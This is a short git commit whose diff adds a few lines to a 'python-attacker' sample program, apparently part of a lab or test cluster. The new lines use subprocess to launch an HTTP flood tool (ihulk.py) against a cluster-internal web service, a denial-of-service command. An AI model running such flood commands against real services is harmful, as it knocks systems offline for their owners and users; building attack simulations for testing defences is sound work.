8c8be76504ab5c9bcc9c5e08012fd29b05d20570
hvhq <vanhienhuynh396@gmail.com>
2022-07-22 16:11:03 +0700

    Add attack script to python-attacker

--- sample-src/python-attacker/src/main.py
+++ sample-src/python-attacker/src/main.py
@@ -1,3 +1,9 @@
+import subprocess
+
+command = "python3 /home/server/ihulk/src/ihulk.py http://web.default.svc.cluster.local safe"
+process = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
+output, error = process.communicate()
+
 k=0
 while True:
    k=k+1
